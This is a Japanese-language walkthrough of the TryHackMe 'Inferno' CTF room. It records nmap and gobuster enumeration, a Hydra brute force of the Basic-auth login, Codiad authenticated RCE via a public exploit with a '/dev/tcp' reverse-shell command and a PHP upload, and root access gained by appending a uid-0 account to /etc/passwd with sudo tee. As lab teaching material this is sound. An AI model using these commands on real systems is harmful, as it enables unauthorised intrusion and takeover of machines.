# Inferno CTF

https://tryhackme.com/room/inferno

## Enumeration

```shell
TARGET=10.201.58.157
sudo bash -c "echo $TARGET   inferno.thm >> /etc/hosts"
```

### ポートスキャン

```sh
rustscan -a $TARGET
```

多数のポートがOpenしていることが分かる。全Openポートについて、-sV を実行。

```sh
sudo nmap -vv -sV -p21,22,23,25,80,88,106,110,194,389,443,464,636,750,775,777,779,783,808,873,1001,1178,1210,1236,1300,1313,1314,1529,2000,2003,2121,2150,2600,2601,2602,2603,2604,2605,2606,2607,2608,2988,2989,4224,4557,4559,4600,4949,5051,5052,5151,5354,5355,5432,5555,5666,5667,5674,5675,5680,6346,6514,6566,6667,8021,8081,8088,8990,9098,9359,9418,9673,10000,10081,10082,10083,11201,15345,17001,17002,17003,17004,20011,20012,24554,27374,30865,57000,60177,60179 $TARGET

PORT      STATE SERVICE           REASON         VERSION
21/tcp    open  ftp?              syn-ack ttl 64
22/tcp    open  ssh               syn-ack ttl 64 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
23/tcp    open  telnet?           syn-ack ttl 64
25/tcp    open  smtp?             syn-ack ttl 64
80/tcp    open  http              syn-ack ttl 64 Apache httpd 2.4.41 ((Ubuntu))
88/tcp    open  kerberos-sec?     syn-ack ttl 64
106/tcp   open  pop3pw?           syn-ack ttl 64
110/tcp   open  pop3?             syn-ack ttl 64
194/tcp   open  irc?              syn-ack ttl 64
389/tcp   open  ldap?             syn-ack ttl 64
443/tcp   open  https?            syn-ack ttl 64
464/tcp   open  kpasswd5?         syn-ack ttl 64
636/tcp   open  ldapssl?          syn-ack ttl 64
750/tcp   open  kerberos?         syn-ack ttl 64
775/tcp   open  entomb?           syn-ack ttl 64
777/tcp   open  multiling-http?   syn-ack ttl 64
779/tcp   open  unknown           syn-ack ttl 64
783/tcp   open  spamassassin?     syn-ack ttl 64
808/tcp   open  ccproxy-http?     syn-ack ttl 64
873/tcp   open  rsync?            syn-ack ttl 64
1001/tcp  open  webpush?          syn-ack ttl 64
1178/tcp  open  skkserv?          syn-ack ttl 64
1210/tcp  open  eoss?             syn-ack ttl 64
1236/tcp  open  bvcontrol?        syn-ack ttl 64
1300/tcp  open  h323hostcallsc?   syn-ack ttl 64
1313/tcp  open  bmc_patroldb?     syn-ack ttl 64
1314/tcp  open  pdps?             syn-ack ttl 64
1529/tcp  open  support?          syn-ack ttl 64
2000/tcp  open  cisco-sccp?       syn-ack ttl 64
2003/tcp  open  finger?           syn-ack ttl 64
2121/tcp  open  ccproxy-ftp?      syn-ack ttl 64
2150/tcp  open  dynamic3d?        syn-ack ttl 64
2600/tcp  open  zebrasrv?         syn-ack ttl 64
2601/tcp  open  zebra?            syn-ack ttl 64
2602/tcp  open  ripd?             syn-ack ttl 64
2603/tcp  open  ripngd?           syn-ack ttl 64
2604/tcp  open  ospfd?            syn-ack ttl 64
2605/tcp  open  bgpd?             syn-ack ttl 64
2606/tcp  open  netmon?           syn-ack ttl 64
2607/tcp  open  connection?       syn-ack ttl 64
2608/tcp  open  wag-service?      syn-ack ttl 64
2988/tcp  open  hippad?           syn-ack ttl 64
2989/tcp  open  zarkov?           syn-ack ttl 64
4224/tcp  open  xtell?            syn-ack ttl 64
4557/tcp  open  fax?              syn-ack ttl 64
4559/tcp  open  hylafax?          syn-ack ttl 64
4600/tcp  open  piranha1?         syn-ack ttl 64
4949/tcp  open  munin?            syn-ack ttl 64
5051/tcp  open  ida-agent?        syn-ack ttl 64
5052/tcp  open  ita-manager?      syn-ack ttl 64
5151/tcp  open  esri_sde?         syn-ack ttl 64
5354/tcp  open  mdnsresponder?    syn-ack ttl 64
5355/tcp  open  llmnr?            syn-ack ttl 64
5432/tcp  open  postgresql?       syn-ack ttl 64
5555/tcp  open  freeciv?          syn-ack ttl 64
5666/tcp  open  nrpe?             syn-ack ttl 64
5667/tcp  open  unknown           syn-ack ttl 64
5674/tcp  open  hyperscsi-port?   syn-ack ttl 64
5675/tcp  open  v5ua?             syn-ack ttl 64
5680/tcp  open  canna?            syn-ack ttl 64
6346/tcp  open  gnutella?         syn-ack ttl 64
6514/tcp  open  syslog-tls?       syn-ack ttl 64
6566/tcp  open  sane-port?        syn-ack ttl 64
6667/tcp  open  irc?              syn-ack ttl 64
8021/tcp  open  ftp-proxy?        syn-ack ttl 64
8081/tcp  open  blackice-icecap?  syn-ack ttl 64
8088/tcp  open  radan-http?       syn-ack ttl 64
8990/tcp  open  http-wmap?        syn-ack ttl 64
9098/tcp  open  unknown           syn-ack ttl 64
9359/tcp  open  unknown           syn-ack ttl 64
9418/tcp  open  git?              syn-ack ttl 64
9673/tcp  open  unknown           syn-ack ttl 64
10000/tcp open  snet-sensor-mgmt? syn-ack ttl 64
10081/tcp open  famdc?            syn-ack ttl 64
10082/tcp open  amandaidx?        syn-ack ttl 64
10083/tcp open  amidxtape?        syn-ack ttl 64
11201/tcp open  smsqp?            syn-ack ttl 64
15345/tcp open  xpilot?           syn-ack ttl 64
17001/tcp open  unknown           syn-ack ttl 64
17002/tcp open  unknown           syn-ack ttl 64
17003/tcp open  unknown           syn-ack ttl 64
17004/tcp open  unknown           syn-ack ttl 64
20011/tcp open  unknown           syn-ack ttl 64
20012/tcp open  ss-idi-disc?      syn-ack ttl 64
24554/tcp open  binkp?            syn-ack ttl 64
27374/tcp open  subseven?         syn-ack ttl 64
30865/tcp open  unknown           syn-ack ttl 64
57000/tcp open  unknown           syn-ack ttl 64
60177/tcp open  unknown           syn-ack ttl 64
60179/tcp open  unknown           syn-ack ttl 64
```

多数のポートが開いているが、判明したのはHTTPとSSHだけ。

### ディレクトリ列挙

/inferno ディレクトリを発見。アクセスしたらBasic認証のダイアログが表示される。

```shell
cat /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt | sort -u > ./dirlist.txt

gobuster dir -q -x=txt,php -u http://$TARGET -w ./dirlist.txt -t 64 -k

/inferno              (Status: 401) [Size: 460]
```

ログインしたいが、手掛かりがない。1.jpgを解析しても何も出なかった。

Webコンテンツからリストファイルを作ってパスワードブルートフォースをしたが、失敗。

```sh
$ cewl -w list.txt -d 2 http://inferno.thm

$ hydra -l admin -P ./list.txt inferno.thm -m /inferno http-get -t 30
```

rockyouでadminパスワードをクラックできた。

```sh
root@ip-10-201-78-118:~# hydra -l admin -P /usr/share/wordlists/rockyou.txt inferno.thm -m /inferno http-get -t 30
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-08-20 07:52:37
[DATA] max 30 tasks per 1 server, overall 30 tasks, 14344398 login tries (l:1/p:14344398), ~478147 tries per task
[DATA] attacking http-get://inferno.thm:80/inferno
[80][http-get] host: inferno.thm   login: admin   password: [REDACTED]
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-08-20 07:53:43
```

再度ログイン画面が表示されるので同じ認証情報を入れたら、Codiad Web IDEの画面が表示された。

PHPを編集してみたが、File could not be saved と表示され、保存はできなかった。

バージョンはわからないが、Codiadには認証RCEがある。

```sh
$ searchsploit Codiad 
--------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                   |  Path
--------------------------------------------------------------------------------- ---------------------------------
Codiad 2.4.3 - Multiple Vulnerabilities                                          | php/webapps/35585.txt
Codiad 2.5.3 - Local File Inclusion                                              | php/webapps/36371.txt
Codiad 2.8.4 - Remote Code Execution (Authenticated)                             | multiple/webapps/49705.py
Codiad 2.8.4 - Remote Code Execution (Authenticated) (2)                         | multiple/webapps/49902.py
Codiad 2.8.4 - Remote Code Execution (Authenticated) (3)                         | multiple/webapps/49907.py
Codiad 2.8.4 - Remote Code Execution (Authenticated) (4)                         | multiple/webapps/50474.txt
--------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

49705.py。そのままではログインできなかったので、セッションにBasic認証を設定する改造を入れて実行したが、シェル取得までは至らなかった。

```sh
$ python ./49705.py http://inferno.thm/inferno admin dante1 10.11.146.32 8888 linux
[+] Please execute the following command on your vps: 
echo 'bash -c "bash -i >/dev/tcp/10.11.146.32/8889 0>&1 2>&1"' | nc -lnvp 8888
nc -lnvp 8889
[+] Please confirm that you have done the two command above [y/n]
[Y/n] Y
[+] Starting...
[+] Login Content : {"status":"success","data":{"username":"admin"}}
[+] Login success!
[+] Getting writeable path...
[+] Path Content : {"status":"success","data":{"name":"inferno","path":"\/var\/www\/html\/inferno"}}
[+] Writeable Path : /var/www/html/inferno
[+] Sending payload...
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.41 (Ubuntu) Server at inferno.thm Port 80</address>
</body></html>

[+] Exploit finished!
[+] Enjoy your reverse shell!
```

50474.txt に従って、IDEからPHPをアップロードできた。  
手順に従い、PHPを実行。

```sh
$ curl http://inferno.thm/inferno/themes/default/filemanager/images/codiad/manifest/files/codiad/example/INF/pentest.php -u "admin:dante1"
```

リバースシェル取得成功。

```
$ nc -lnvp 8888                                                                 
listening on [any] 8888 ...
connect to [10.11.146.32] from (UNKNOWN) [10.201.58.157] 60028
Linux ip-10-201-58-157 5.15.0-138-generic #148~20.04.1-Ubuntu SMP Fri Mar 28 14:32:35 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
 07:30:06 up  1:12,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## 権限昇格１

Downloads フォルダの .download.dat を開くと、HEX値が入っている。これをASCII変換すると、danteの認証情報が出てきた。それを使い、SSH接続可能になる。

```sh
www-data@ip-10-201-58-157:/home/dante/Downloads$ cat .download.dat
cat .download.dat
c2 ab 4f 72 20 73 65 e2 80 99 20 74 75 20 71 75 65 6c 20 56 69 72 67 69 6c 69 6f 20 65 20 71 75 65 6c 6c 61 20 66 6f 6e 74 65 0a 63 68 65 20 73 70 61 6e 64 69 20 64 69 20 70 61 72 6c 61 72 20 73 c3 ac 20 6c [REDACTED]
```

## 権限昇格２

teeにsudoが付いているので、任意のファイルに書き込みできる。

```sh
dante@ip-10-201-58-157:~$ sudo -l
Matching Defaults entries for dante on ip-10-201-58-157:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dante may run the following commands on ip-10-201-58-157:
    (root) NOPASSWD: /usr/bin/tee
```

root権限を持つhackユーザーを追加。

```sh
echo 'hack:$6$iKT0DD1bVJB7gMzZ$akdcQrmTc2md/BuNpyEh1WCwTYE1Ax5Dx0EeNG74/PShO8JtI5hF.mh1iFB5NHRx/yO6H28WE14Ie4Re7xuwV1:0:0:root:/root:/bin/bash' | sudo tee -a /etc/passwd
```

hackユーザーにスイッチ。

```sh
dante@ip-10-201-58-157:~$ su hack
Password: 
root@ip-10-201-58-157:/home/dante# id
uid=0(root) gid=0(root) groups=0(root)
```

## 振り返り

- rockyou.txt でブルートフォースする珍しいパターン。
- searchsploit で複数のバージョンで複数の脆弱性があるとき、番号が若い方が有効かもしれない。
